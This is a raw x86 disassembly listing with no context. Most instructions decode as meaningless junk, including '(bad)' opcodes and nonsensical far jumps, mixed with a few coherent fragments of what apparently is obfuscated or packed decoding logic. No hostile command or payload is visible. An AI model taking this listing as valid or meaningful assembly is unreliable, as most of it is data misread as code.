  40ac01:	mov    al,ds:0x700047a8
  40ac06:	fs call 0x1fd8:0xca2e1c42
  40ac0e:	dec    ecx
  40ac0f:	fiadd  DWORD PTR [ebx-0x54]
  40ac12:	push   0xa57a2f0
  40ac17:	aad    0x8e
  40ac19:	ds jmp 0x9e345fe6
  40ac1f:	sub    DWORD PTR [ecx],ebp
  40ac21:	rcr    DWORD PTR [ecx],0x2a
  40ac24:	push   ds
  40ac25:	pushf  
  40ac26:	jb     0x40ac76
  40ac28:	sti    
  40ac29:	outs   dx,DWORD PTR ds:[esi]
  40ac2a:	xor    ecx,eax
  40ac2c:	sbb    BYTE PTR [ecx+0x35],dh
  40ac2f:	and    al,0xda
  40ac31:	ret    0x8d50
  40ac34:	mov    edi,0xc76dabc5
  40ac39:	sbb    eax,0xc8f65d8c
  40ac3e:	out    dx,al
  40ac3f:	iret   
  40ac40:	and    al,0xe8
  40ac42:	and    ah,BYTE PTR ds:0x7dad8195
  40ac48:	je     0x40ac3c
  40ac4a:	and    BYTE PTR [esi],0x34
  40ac4d:	push   ecx
  40ac4e:	in     eax,0xe9
  40ac50:	fcomi  st,st(1)
  40ac52:	add    al,BYTE PTR [esi+0x6fa926a8]
  40ac58:	xchg   esi,eax
  40ac59:	xchg   ebp,ecx
  40ac5b:	dec    DWORD PTR [esi+eiz*1+0x3a]
  40ac5f:	ds jmp 0x80b0:0x40c93f29
  40ac67:	outs   dx,DWORD PTR gs:[si]
  40ac6a:	daa    
  40ac6b:	and    ch,BYTE PTR [ebx-0x23d3d87c]
  40ac71:	out    0x7a,eax
  40ac73:	fmulp  st(2),st
  40ac75:	adc    al,0xf0
  40ac77:	mov    esi,0x68da615c
  40ac7c:	mov    WORD PTR [ebx],cs
  40ac7e:	mov    eax,0x20f2901f
  40ac83:	pop    edi
  40ac84:	pop    ebx
  40ac85:	ss add ebx,0x26d33a0e
  40ac8c:	xchg   DWORD PTR [ecx+eax*1-0x49],eax
  40ac90:	aaa    
  40ac91:	fld    st(5)
  40ac93:	add    BYTE PTR [ecx+0x727a1f63],bl
  40ac99:	xchg   esi,eax
  40ac9a:	aas    
  40ac9b:	(bad)  
  40ac9c:	mov    ch,BYTE PTR [esi]
  40ac9e:	mov    bl,0x18
  40aca0:	mov    edx,DWORD PTR [ecx]
  40aca2:	pop    ss
  40aca3:	stos   BYTE PTR es:[edi],al
  40aca4:	retf   
  40aca5:	push   ebx
  40aca6:	pop    eax
  40aca7:	sahf   
  40aca8:	pop    ebx
  40aca9:	dec    ebx
  40acaa:	jne    0x40ac32
  40acac:	mov    ds:0xab7f3a60,eax
  40acb1:	rcl    dh,0x11
  40acb4:	pushfw 
  40acb6:	fild   QWORD PTR [ebx+0x1d1ca5a1]
  40acbc:	inc    esi
  40acbd:	or     bl,BYTE PTR [ebx+0x24]
  40acc0:	cmc    
  40acc1:	fcmovne st,st(0)
  40acc3:	cwde   
  40acc4:	fs sub al,0xa9
  40acc7:	add    al,0x38
  40acc9:	nop
  40acca:	dec    esi
  40accb:	push   es
  40accc:	jecxz  0x40ac72
  40acce:	dec    esi
  40accf:	push   edi
  40acd0:	xor    ah,dh
  40acd2:	adc    edx,eax
  40acd4:	std    
  40acd5:	ficomp WORD PTR [edi+0x35]
  40acd8:	push   ecx
  40acd9:	pop    ds
  40acda:	cs jmp 0x40ad30
  40acdd:	stos   DWORD PTR es:[edi],eax
  40acde:	jle    0x40acb3
  40ace0:	dec    edx
  40ace1:	in     al,dx
  40ace2:	repz sbb esi,DWORD PTR [ebx+0x74]
  40ace6:	sbb    bh,al
  40ace8:	call   0x96f6bc40
  40aced:	ret    0x15fa
  40acf0:	(bad)  
  40acf2:	ss and al,0xc9
  40acf5:	dec    esp
  40acf6:	cmc    
  40acf7:	cld    
  40acf8:	(bad)  
  40acf9:	arpl   WORD PTR [ebp-0x10443f96],dx
  40acff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad00:	(bad)  
  40ad01:	jae    0x40ad44
  40ad03:	lahf   
  40ad04:	stos   BYTE PTR es:[edi],al
  40ad05:	or     al,BYTE PTR [edx+0x30a80031]
  40ad0b:	das    
  40ad0c:	call   0xb7c2a69b
  40ad11:	pop    ebx
  40ad12:	paddd  mm7,mm4
  40ad15:	or     al,0x2e
  40ad17:	aad    0x83
  40ad19:	shl    DWORD PTR [edx+eiz*4-0x3f],1
  40ad1d:	cmp    DWORD PTR [edx+ebx*8+0x4e9c853d],0xd172b90c
  40ad28:	(bad)  
  40ad29:	jbe    0x40acce
  40ad2b:	retf   
  40ad2c:	mov    esi,0xef83a11c
  40ad31:	push   ds
  40ad32:	mov    BYTE PTR [esi+0x61],bh
  40ad35:	mov    eax,ds:0x3def41f
  40ad3a:	ror    DWORD PTR [ebx+0x98bf84d],0x8b
  40ad41:	add    al,0x8
  40ad43:	mov    DWORD PTR [ebp-0x1c],eax
  40ad46:	mov    eax,DWORD PTR [ebp+0x8]
  40ad49:	xor    eax,esi
  40ad4b:	add    eax,edi
  40ad4d:	mov    DWORD PTR [ebp-0x20],eax
  40ad50:	mov    eax,DWORD PTR [ebp+0x8]
  40ad53:	mov    ecx,DWORD PTR [ebp-0x1c]
  40ad56:	xor    eax,esi
  40ad58:	add    eax,edi
  40ad5a:	cmp    ecx,eax
  40ad5c:	je     0x40c082
  40ad62:	mov    eax,DWORD PTR [ebp-0x8]
  40ad65:	mov    ecx,DWORD PTR [ebp-0x1c]
  40ad68:	add    ecx,DWORD PTR [eax]
  40ad6a:	mov    DWORD PTR [ebp-0x20],ecx
  40ad6d:	jmp    0x40b08e
  40ad72:	adc    edx,esi
  40ad74:	inc    ebx
  40ad75:	sahf   
  40ad76:	popa   
  40ad77:	scas   eax,DWORD PTR es:[edi]
  40ad78:	icebp  
  40ad79:	jno    0x40adf2
  40ad7b:	ficomp WORD PTR [edi+0x7e3015c7]
  40ad81:	stc    
  40ad82:	add    bl,dh
  40ad84:	jle    0x40ae04
  40ad86:	jp     0x40ae05
  40ad88:	jle    0x40ae08
  40ad8a:	or     eax,ecx
  40ad8c:	add    DWORD PTR [ecx],ecx
  40ad8e:	jge    0x40ad58
  40ad90:	or     ah,BYTE PTR ds:0x8ac0c304
  40ad96:	pop    ebp
  40ad97:	add    al,0x15
  40ad99:	jg     0x40ad47
  40ad9b:	inc    ecx
  40ad9c:	mov    ecx,0x22afc51a
  40ada1:	(bad)  
  40ada2:	xor    bh,dh
  40ada4:	ss ret 
  40ada6:	out    dx,al
  40ada7:	(bad)  
  40ada8:	lahf   
  40ada9:	fist   WORD PTR [edi-0xf328382]
  40adaf:	ds aam 0x18
  40adb2:	mov    ds:0xf6e1a0e2,eax
  40adb7:	pop    edi
  40adb8:	ja     0x40ad90
  40adba:	pusha  
  40adbb:	sti    
  40adbc:	push   edi
  40adbd:	sti    
  40adbe:	mov    esp,0xe2ead60e
  40adc3:	popf   
  40adc4:	sbb    ah,BYTE PTR [eax-0x1d49d172]
  40adca:	and    BYTE PTR [ebx+0x40],cl
  40adcd:	mov    bl,0x5f
  40adcf:	xor    bl,BYTE PTR [edi]
  40add1:	or     bh,BYTE PTR ds:0xd5bec2c6
  40add7:	mov    edi,0x77dcef9c
  40addc:	cmp    eax,0xb5a1713a
  40ade1:	jp     0x40ae1f
  40ade3:	aaa    
  40ade4:	mov    ds:0x2011094,al
  40ade9:	js     0x40ae46
  40adeb:	xor    eax,0xd20decaf
  40adf0:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  40adf2:	hlt    
  40adf3:	and    DWORD PTR [edx+0x78],edi
  40adf6:	lds    esp,FWORD PTR [ecx-0x2b]
  40adf9:	dec    ebx
  40adfa:	outs   dx,BYTE PTR ds:[esi]
  40adfb:	jnp    0x40ade1
  40adfd:	add    al,0x88
  40adff:	mov    eax,0x52397a7
  40ae04:	(bad)  
  40ae05:	js     0x40add0
  40ae07:	mov    ebp,0xf8625eed
  40ae0c:	xchg   DWORD PTR [eax+0x15],ebp
  40ae0f:	cmp    edx,0x53
  40ae12:	or     ah,BYTE PTR [edx+0x47]
  40ae15:	dec    edx
  40ae16:	xchg   ecx,eax
  40ae17:	data16 scas al,BYTE PTR es:[edi]
  40ae19:	sbb    DWORD PTR [ebp-0x77],ebx
  40ae1c:	(bad)  
  40ae1d:	aam    0xa0
  40ae1f:	lods   al,BYTE PTR ds:[esi]
  40ae20:	mov    cs,WORD PTR [esi+0x2a]
  40ae23:	xor    al,0x4b
  40ae25:	mov    edx,0x315cfc4
  40ae2a:	pop    ss
  40ae2b:	fcmovne st,st(5)
  40ae2d:	adc    al,0xfd
  40ae2f:	fnsave ds:0xdf5638bc
  40ae35:	mov    esp,0x646b8c12
  40ae3a:	imul   ebx,DWORD PTR [edx-0x69],0xa685dfbc
  40ae41:	push   ebx
  40ae42:	sbb    eax,0x3791bcd0
  40ae47:	mov    esi,0x141aa8fc
  40ae4c:	adc    al,0x7a
  40ae4e:	scas   eax,DWORD PTR es:[edi]
  40ae4f:	(bad)  
  40ae50:	adc    al,0x60
  40ae52:	into   
  40ae53:	adc    DWORD PTR [esi+0x2],eax
  40ae56:	sbb    eax,0x5070fc3d
  40ae5b:	inc    ebx
  40ae5c:	aaa    
  40ae5d:	sbb    DWORD PTR [ecx],esi
  40ae5f:	lahf   
  40ae60:	and    BYTE PTR [eax-0x1b7a246],0xeb
  40ae67:	or     ecx,DWORD PTR [ecx]
  40ae69:	jge    0x40aec8
  40ae6b:	clc    
  40ae6c:	loope  0x40ae44
  40ae6e:	or     dh,ch
  40ae70:	push   esi
  40ae71:	dec    dl
  40ae73:	and    BYTE PTR [esi],bl
  40ae75:	cmp    eax,DWORD PTR [edx+0x55]
  40ae78:	fisubr DWORD PTR [eax+0x29]
  40ae7b:	sub    DWORD PTR [ecx],ebp
  40ae7d:	jl     0x40aedc
  40ae7f:	and    dl,bl
  40ae81:	sbb    eax,edx
  40ae83:	mov    eax,ds:0x85db1f18
  40ae88:	cmp    DWORD PTR [ecx-0x654169],esi
  40ae8e:	out    dx,al
  40ae8f:	nop
  40ae90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae91:	push   0xffffffc7
  40ae93:	fdivrp st(0),st
  40ae95:	nop
  40ae96:	sub    DWORD PTR [edx+0x134a50d0],edx
  40ae9c:	test   DWORD PTR [ecx],edi
  40ae9e:	ror    BYTE PTR [ebp-0x69934f9e],1
  40aea4:	xchg   ebp,eax
  40aea5:	shl    DWORD PTR [esi-0x2d5f35a4],cl
  40aeab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aeac:	mov    BYTE PTR [ebp-0x2b],bh
  40aeaf:	in     eax,dx
  40aeb0:	inc    ecx
  40aeb1:	cli    
  40aeb2:	jge    0x40aecd
  40aeb4:	jmp    0xbccf0dee
  40aeb9:	enter  0xeefa,0x8d
  40aebd:	(bad)  
  40aebe:	ficomp DWORD PTR [ecx-0x76]
  40aec1:	js     0x40af0c
  40aec3:	adc    dh,dh
  40aec5:	xchg   ebp,eax
  40aec6:	sbb    eax,0xfc8b802b
  40aecb:	xchg   ecx,eax
  40aecc:	pusha  
  40aecd:	jmp    0xc539c51c
  40aed2:	add    al,0x63
  40aed4:	xchg   esp,eax
  40aed5:	sbb    dh,BYTE PTR ds:0xaef2a47e
  40aedb:	mov    cl,0xe1
  40aedd:	xor    ch,BYTE PTR [ecx+0x31e17522]
  40aee3:	out    0x4d,eax
  40aee5:	dec    ebp
  40aee6:	push   edx
  40aee7:	add    BYTE PTR [ebp+0x55e2a63c],dh
  40aeed:	iret   
  40aeee:	enter  0x2809,0x46
  40aef2:	je     0x40aef0
  40aef4:	in     al,dx
  40aef5:	test   DWORD PTR [eax-0x3d],0xd243cd84
  40aefc:	iret   
  40aefd:	fs pop eax
  40aeff:	or     eax,DWORD PTR [ebx+0x6acf917e]
  40af05:	inc    ecx
  40af06:	test   BYTE PTR [edx+0x5],0x91
  40af0a:	and    DWORD PTR [esi],eax
  40af0c:	sbb    al,0xe5
  40af0e:	pop    ebp
  40af0f:	nop
  40af10:	call   0x7f5b6d3e
  40af15:	ins    BYTE PTR es:[edi],dx
  40af16:	retf   
  40af17:	test   eax,0x29be8478
  40af1c:	ds mov cl,0x6f
  40af1f:	cmp    ebx,DWORD PTR [esi-0x54]
  40af22:	and    bl,BYTE PTR [edi-0x48982208]
  40af28:	out    0x7f,al
  40af2a:	(bad)  
  40af2b:	aaa    
  40af2c:	(bad)  
  40af2d:	and    al,0x6c
  40af2f:	cmp    ah,bh
  40af31:	inc    esi
  40af32:	(bad)  
  40af34:	add    eax,0xf27e7fd5
  40af39:	sub    bl,0x9
  40af3c:	pusha  
  40af3d:	inc    ecx
  40af3e:	sbb    eax,0x83a2f11d
  40af43:	jle    0x40af60
  40af45:	add    ebx,esp
  40af47:	inc    esi
  40af48:	div    DWORD PTR [ebx+esi*2+0x54]
  40af4c:	sbb    BYTE PTR [eax],al
  40af4e:	aad    0x47
  40af50:	inc    ebp
  40af51:	or     ecx,DWORD PTR [ebx+0x1b]
  40af54:	push   ecx
  40af55:	jo     0x40af4f
  40af57:	es int3 
  40af59:	sbb    eax,0x27a041b2
  40af5e:	sahf   
  40af5f:	pop    ecx
  40af60:	outs   dx,DWORD PTR ds:[esi]
  40af61:	xor    ch,bl
  40af63:	ds jno 0x40af01
  40af66:	loope  0x40af4c
  40af68:	lods   eax,DWORD PTR ds:[esi]
  40af69:	mov    cl,0x97
  40af6b:	js     0x40af7e
  40af6d:	jge    0x40afee
  40af6f:	ror    ah,cl
  40af71:	int    0x1
  40af73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af74:	sar    BYTE PTR [ecx],1
  40af76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af77:	ds add eax,0x1563d67
  40af7d:	mov    bh,0x3b
  40af7f:	xlat   BYTE PTR ds:[ebx]
  40af80:	sahf   
  40af81:	or     al,0x2f
  40af83:	jmp    0x40af8c
  40af85:	jmp    0xcaa92aae
  40af8a:	jb     0x40afd3
  40af8c:	into   
  40af8d:	call   0xbe239a61
  40af92:	mov    cl,0xf0
  40af94:	adc    edi,DWORD PTR [ebx-0x76]
  40af97:	pop    edi
  40af98:	mov    al,0xe8
  40af9a:	mov    edx,0x9189751a
  40af9f:	sub    dl,dl
  40afa1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40afa2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40afa3:	ret    
  40afa4:	sbb    cl,ah
  40afa6:	sbb    al,BYTE PTR [edx+0x24]
  40afa9:	aad    0x1a
  40afab:	ja     0x40af9b
  40afad:	rcr    BYTE PTR [edi-0x1e],1
  40afb0:	push   ebx
  40afb1:	out    0xd1,eax
  40afb3:	in     eax,dx
  40afb4:	adc    ecx,DWORD PTR [edi-0x6d]
  40afb7:	cmp    DWORD PTR ds:0x1afad50b,esi
  40afbd:	(bad)  [ebp-0x3958fc09]
  40afc3:	pusha  
  40afc4:	frstor [ebx-0x10b7b13a]
  40afca:	sbb    ebx,ebp
  40afcc:	mov    ebx,0x417467dc
  40afd1:	dec    edi
  40afd2:	push   eax
  40afd3:	imul   eax,DWORD PTR [edx],0x6c
  40afd6:	push   es
  40afd7:	mov    ah,0x38
  40afd9:	and    ebp,edi
  40afdb:	push   eax
  40afdc:	or     eax,0x69a7068c
  40afe1:	lock cwde 
  40afe3:	mov    esi,ebp
  40afe5:	mov    eax,ds:0x47a10333
  40afea:	(bad)  
  40afeb:	jl     0x40afe4
  40afed:	jns    0x40b03e
  40afef:	mov    ebp,0xa3dfa044
  40aff4:	les    ecx,FWORD PTR [ebx-0x5a]
  40aff7:	nop
  40aff8:	inc    ebp
  40aff9:	test   al,0x93
  40affb:	outs   dx,BYTE PTR ds:[esi]
  40affc:	pop    ds
  40affd:	xor    DWORD PTR [eax+0x535c4773],ebp
  40b003:	sahf   
  40b004:	cwde   
  40b005:	adc    dh,BYTE PTR [ebx-0x6a0bc844]
  40b00b:	push   0x48
  40b00d:	mov    dh,0x2
  40b00f:	shl    BYTE PTR [eax-0x69041a6],1
  40b015:	sbb    cl,dl
  40b017:	std    
  40b018:	inc    edi
  40b019:	jp     0x40b011
  40b01b:	adc    ah,BYTE PTR [ebx-0x22]
  40b01e:	out    dx,al
  40b01f:	cmp    esp,DWORD PTR [ebp+0x3648dfbe]
  40b025:	retf   
  40b026:	ins    DWORD PTR es:[edi],dx
  40b027:	mov    ss,WORD PTR [edx-0x4289352f]
  40b02d:	pop    es
  40b02e:	pop    ebx
  40b02f:	mov    ds:0xcdc37919,al
  40b034:	out    0xf7,al
  40b036:	adc    DWORD PTR [ecx+esi*4],ebx
  40b039:	repz js 0x40b09e
  40b03c:	or     DWORD PTR [esi+0x6d15834a],eax
  40b042:	imul   ebp,DWORD PTR [ecx-0x48eb9b5b],0x26f383d0
  40b04c:	xchg   esi,eax
  40b04d:	gs cmp cl,bh
  40b050:	push   ds
  40b051:	icebp  
  40b052:	mov    DWORD PTR [ebp+0x31],0xe5aac992
  40b059:	mov    edi,0x92dc84f4
  40b05e:	xchg   ecx,eax
  40b05f:	pop    esi
  40b060:	cmp    dl,bh
  40b062:	(bad)  [edx-0x3e]
  40b065:	mov    DWORD PTR [edi-0x6bad37cb],ecx
  40b06b:	and    edx,edx
  40b06d:	sub    al,BYTE PTR [eax]
  40b06f:	das    
  40b070:	fs in  eax,0x83
  40b073:	sar    ah,0x1d
  40b076:	test   DWORD PTR [ecx*4-0x3c4cb731],eax
  40b07d:	mov    dh,0xcb
  40b07f:	lock in eax,0x3c
  40b082:	outs   dx,DWORD PTR ds:[esi]
  40b083:	jns    0x40b0e6
  40b085:	cdq    
  40b086:	into   
  40b087:	dec    edi
  40b088:	lock xor eax,0xa66c5d25
  40b08e:	mov    eax,DWORD PTR [ebp-0x20]
  40b091:	mov    ecx,DWORD PTR [ebp-0x8]
  40b094:	mov    eax,DWORD PTR [eax+0xc]
  40b097:	mov    ecx,DWORD PTR [ecx]
  40b099:	mov    al,BYTE PTR [eax+ecx*1]
  40b09c:	add    al,0x38
  40b09e:	xor    al,0x46
  40b0a0:	cmp    al,0xc5
  40b0a2:	je     0x40b6fb
  40b0a8:	jmp    0x40b3c9
  40b0ad:	sar    DWORD PTR [ecx],1
  40b0af:	mov    cl,0xa4
  40b0b1:	mov    cl,0x74
  40b0b3:	shr    DWORD PTR [ecx+0x55],1
  40b0b6:	fsubr  DWORD PTR [eax+0x37]
  40b0b9:	push   eax
  40b0ba:	xchg   ebx,eax
  40b0bb:	mov    cl,0xc9
  40b0bd:	or     al,0xfe
  40b0bf:	jle    0x40b13f
  40b0c1:	jp     0x40b140
  40b0c3:	jle    0x40b143
  40b0c5:	inc    ecx
  40b0c6:	xor    BYTE PTR [edx-0x7113cf5d],ah
  40b0cc:	icebp  
  40b0cd:	jl     0x40b0bb
  40b0cf:	cmp    al,0xfd
  40b0d1:	outs   dx,BYTE PTR ds:[esi]
  40b0d2:	inc    ebp
  40b0d3:	mov    dl,0x8c
  40b0d5:	add    ebx,DWORD PTR [ecx]
  40b0d7:	jl     0x40b0aa
  40b0d9:	in     al,dx
  40b0da:	gs lahf 
  40b0dc:	lock ret 0x1a6
  40b0e0:	hlt    
  40b0e1:	movq   mm1,mm4
  40b0e4:	sbb    ecx,DWORD PTR [ecx+0x16]
  40b0e7:	sub    ch,cl
  40b0e9:	pusha  
  40b0ea:	mov    dl,0xb8
  40b0ec:	inc    edx
  40b0ed:	loop   0x40b155
  40b0ef:	push   ss
  40b0f0:	add    esi,esi
  40b0f2:	jg     0x40b079
  40b0f4:	adc    esi,eax
  40b0f6:	mov    DWORD PTR [edi],ebx
  40b0f8:	cmp    al,0xe1
  40b0fa:	mov    dl,0x77
  40b0fc:	push   esi
  40b0fd:	pusha  
  40b0fe:	sub    ch,BYTE PTR [ebx+0x202aa25d]
  40b104:	out    0xe9,al
  40b106:	xor    DWORD PTR [ebp+edi*2-0x61],esi
  40b10a:	cli    
  40b10b:	int    0x71
  40b10d:	ja     0x40b101
  40b10f:	std    
  40b110:	cdq    
  40b111:	ret    0x9526
  40b114:	mov    ebx,0x5d04f588
  40b119:	mov    eax,0x30590e3a
  40b11e:	fbstp  TBYTE PTR [edx+0x776c4821]
  40b124:	and    al,0x22
  40b126:	nop
  40b127:	sub    ebx,esp
  40b129:	scas   al,BYTE PTR es:[edi]
  40b12a:	inc    eax
  40b12b:	shl    DWORD PTR [ebp-0x64],cl
  40b12e:	fcmovnu st,st(7)
  40b130:	lods   al,BYTE PTR ds:[esi]
  40b131:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b132:	push   eax
  40b133:	repz mov edi,0x1aa29b3e
  40b139:	sbb    edx,DWORD PTR [ecx]
  40b13b:	mov    edi,0xedf153fc
  40b140:	mov    DWORD PTR [esp+edx*1+0x5b15fde4],ebp
  40b147:	cmp    dl,BYTE PTR [ebx]
  40b149:	std    
  40b14a:	mov    ebx,0x31708d6a
  40b14f:	lods   al,BYTE PTR ds:[esi]
  40b150:	xchg   esi,eax
  40b151:	jmp    0xa0a77117
  40b156:	push   0xffffff9f
  40b158:	fisub  DWORD PTR [edx-0x7f9daf81]
  40b15e:	pop    edi
  40b15f:	xchg   ebx,ebp
  40b161:	mov    bh,0xc
  40b163:	xchg   DWORD PTR [eax+ebx*8],ecx
  40b166:	or     eax,0xc96efafa
  40b16b:	ins    DWORD PTR es:[edi],dx
  40b16c:	inc    esi
  40b16d:	aaa    
  40b16e:	pop    ecx
  40b16f:	mov    es,WORD PTR [edi+ebx*4-0x72c59b8b]
  40b176:	mov    ah,0x65
  40b178:	xor    dl,BYTE PTR [esi+0x1ebdf0b4]
  40b17e:	ret    
  40b17f:	jae    0x40b14a
  40b181:	jp     0x40b19b
  40b183:	inc    edx
  40b184:	inc    esp
  40b185:	jge    0x40b1b6
  40b187:	jno    0x40b18d
  40b189:	mov    ch,0x55
  40b18b:	or     eax,0xe275cfc8
  40b190:	inc    ebx
  40b191:	sbb    al,0x25
  40b193:	imul   edx,DWORD PTR [edi-0x8],0xf7a9817e
  40b19a:	icebp  
  40b19b:	imul   edi,DWORD PTR [edi-0x392ebb28],0x1739f53f
  40b1a5:	mov    al,0x22
  40b1a7:	pop    edi
  40b1a8:	cmp    al,BYTE PTR [esi]
  40b1aa:	and    eax,0x7da69fe0
  40b1af:	icebp  
  40b1b0:	adc    al,0x36
  40b1b2:	xchg   ecx,eax
  40b1b3:	mov    dl,0x64
  40b1b5:	dec    ebp
  40b1b6:	pop    es
  40b1b7:	mov    ebp,0x1cdcff08
  40b1bc:	jle    0x40b17b
  40b1be:	cmp    dh,BYTE PTR [ecx]
  40b1c0:	rol    BYTE PTR [edx],0xf0
  40b1c3:	jg     0x40b223
  40b1c5:	add    eax,0xc5b6ee99
  40b1ca:	mov    ebx,0x33d8644d
  40b1cf:	xor    eax,0xb7f24c78
  40b1d4:	or     dh,BYTE PTR [ebp+0x33e6af50]
  40b1da:	lods   al,BYTE PTR ds:[esi]
  40b1db:	push   ebx
  40b1dc:	jbe    0x40b1d1
  40b1de:	jl     0x40b25d
  40b1e0:	cld    
  40b1e1:	out    dx,eax
  40b1e2:	int3   
  40b1e3:	dec    ebx
  40b1e4:	dec    esi
  40b1e5:	(bad)  
  40b1e6:	repz inc ebp
  40b1e8:	es inc eax
  40b1ea:	xor    al,0x89
  40b1ec:	sub    eax,0x8022256
  40b1f1:	fld    DWORD PTR [esi+0x5ef0d2bd]
  40b1f7:	(bad)  
  40b1f8:	lea    ecx,[edi+0x5998f2e5]
  40b1fe:	popf   
  40b1ff:	std    
  40b200:	push   cs
  40b201:	jae    0x40b1ac
  40b203:	jmp    FWORD PTR [esi-0x26e87fb]
  40b209:	add    al,0x0
  40b20b:	cs mov ecx,0x735f0b2f
  40b211:	fcom   DWORD PTR [ecx-0x382b3fdc]
  40b217:	scas   al,BYTE PTR es:[di]
  40b219:	iret   
  40b21a:	mov    dh,0x66
  40b21c:	enter  0x70ca,0x5b
  40b220:	inc    ebx
  40b221:	push   esp
  40b222:	mov    esp,0x3e95d3a4
  40b227:	imul   DWORD PTR [eax+0x43d38342]
  40b22d:	out    dx,al
  40b22e:	sahf   
  40b22f:	add    DWORD PTR [edi],esi
  40b231:	ja     0x40b22f
  40b233:	je     0x40b298
  40b235:	mov    ds:0xc7c901c7,eax
  40b23a:	repz fsub st(7),st
  40b23d:	push   edx
  40b23e:	mov    ds:0x9fa0ad16,eax
  40b243:	mov    bl,0x76
  40b245:	jno    0x40b1de
  40b247:	lahf   
  40b248:	mov    ds,WORD PTR [eax]
  40b24a:	jecxz  0x40b29c
  40b24c:	scas   eax,DWORD PTR es:[edi]
  40b24d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b24e:	jae    0x40b295
  40b250:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b251:	jg     0x40b2ab
  40b253:	or     DWORD PTR [ecx-0x3dff5f10],ecx
  40b259:	aad    0x16
  40b25b:	aad    0x8c
  40b25d:	mov    ah,0x48
  40b25f:	adc    BYTE PTR [ebp+eiz*2-0x217c72d7],al
  40b266:	outs   dx,BYTE PTR ds:[esi]
  40b267:	sti    
  40b268:	jbe    0x40b265
  40b26a:	lods   al,BYTE PTR ds:[esi]
  40b26b:	add    DWORD PTR [eax+0x4b],edx
  40b26e:	adc    eax,0xb3973e71
  40b273:	ss mov ch,0xdc
  40b276:	clc    
  40b277:	daa    
  40b278:	pop    ss
  40b279:	add    DWORD PTR [edx+edi*2-0x2e],ebx
  40b27d:	mov    DWORD PTR [edi+eiz*8],ebx
  40b280:	scas   eax,DWORD PTR es:[edi]
  40b281:	fsubr  DWORD PTR [ebx+0x3acb280d]
  40b287:	jb     0x40b276
  40b289:	fiadd  WORD PTR [eax+0x4]
  40b28c:	stc    
  40b28d:	pop    ss
  40b28e:	out    dx,eax
  40b28f:	mov    WORD PTR [ebx+0x1e],cs
  40b292:	aas    
  40b293:	les    ebp,FWORD PTR [edx+ebx*1+0x471f360d]
  40b29a:	rcl    BYTE PTR [edi],0x64
  40b29d:	xor    DWORD PTR [edx+0x62],ecx
  40b2a0:	(bad)  
  40b2a1:	adc    DWORD PTR cs:[edi+0x3b],ebx
  40b2a5:	mov    esi,DWORD PTR [esi+0x2c]
  40b2a8:	dec    ebx
  40b2a9:	cmp    bh,BYTE PTR [ebp+0x5135ced]
  40b2af:	stos   DWORD PTR es:[edi],eax
  40b2b0:	xchg   ebp,eax
  40b2b1:	mov    cl,0xe6
  40b2b3:	(bad)  
  40b2b4:	fmul   DWORD PTR [esi+0x7d]
  40b2b7:	scas   eax,DWORD PTR es:[edi]
  40b2b8:	iret   
  40b2b9:	(bad)  
  40b2bb:	push   esi
  40b2bc:	out    0x8f,al
  40b2be:	(bad)  
  40b2bf:	ror    BYTE PTR [esi-0x13e0f52],1
  40b2c5:	pusha  
  40b2c6:	xor    eax,0xe759b47c
  40b2cb:	dec    edx
  40b2cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b2cd:	pop    ebx
  40b2ce:	mov    ds:0x88d950bb,eax
  40b2d3:	pop    es
  40b2d4:	mov    WORD PTR [ecx-0xdd47918],es
  40b2da:	mov    ecx,0x3720159
  40b2df:	mov    ebx,0x2f0160cb
  40b2e4:	add    eax,0x7c64755e
  40b2e9:	sub    BYTE PTR [esi+0x16],bh
  40b2ec:	stos   DWORD PTR es:[edi],eax
  40b2ed:	ret    0x1ba6
  40b2f0:	push   0x24fc8fbd
  40b2f5:	outs   dx,DWORD PTR ds:[esi]
  40b2f6:	aad    0xb9
  40b2f8:	aas    
  40b2f9:	leave  
  40b2fa:	xchg   esi,eax
  40b2fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b2fc:	dec    ecx
  40b2fd:	pop    esp
  40b2fe:	jb     0x40b353
  40b300:	sbb    eax,0xdc50130f
  40b305:	(bad)
  40b308:	aam    0xd5
  40b30a:	adc    ch,BYTE PTR ds:0x669932b
  40b310:	dec    ebp
  40b311:	test   al,0x9f
  40b313:	cmc    
  40b314:	test   al,0x9b
  40b316:	jge    0x40b2d2
  40b318:	icebp  
  40b319:	hlt    
  40b31a:	daa    
  40b31b:	in     al,dx
  40b31c:	lods   al,BYTE PTR ds:[esi]
  40b31d:	std    
  40b31e:	fidiv  DWORD PTR [ebx-0x25be53b4]
  40b324:	data16 into 
  40b326:	bound  edi,QWORD PTR [ecx+0x168f23a8]
  40b32c:	xchg   esi,eax
  40b32d:	xor    al,0xe3
  40b32f:	xchg   ebx,eax
  40b330:	sub    ah,BYTE PTR [ecx-0x3f8594c2]
  40b336:	and    al,BYTE PTR [edx+0x7e]
  40b339:	xor    eax,0x2bb19096
  40b33e:	int3   
  40b33f:	and    al,BYTE PTR [edx+0x4c]
  40b342:	mov    cs,WORD PTR [ebx-0x18482923]
  40b348:	xchg   DWORD PTR [ebx],ecx
  40b34a:	call   0x842d:0xce3de686
  40b351:	repz popf 
  40b353:	clc    
  40b354:	mov    ch,0x9e
  40b356:	mov    ah,0x52
  40b358:	setno  BYTE PTR [edi]
  40b35b:	dec    edi
  40b35c:	out    dx,al
  40b35d:	icebp  
  40b35e:	sub    bl,bh
  40b360:	stos   BYTE PTR es:[edi],al
  40b361:	sti    
  40b362:	rcr    DWORD PTR [edx-0x61],0x5a
  40b366:	push   es
  40b367:	daa    
  40b368:	repnz mov dh,0x3a
  40b36b:	cmp    dh,BYTE PTR [esi+0x3]
  40b36e:	cmp    cl,BYTE PTR [ebx+0x4a389ee1]
  40b374:	and    BYTE PTR [edi+0x1cb07d7a],al
  40b37a:	clc    
  40b37b:	or     ebp,ecx
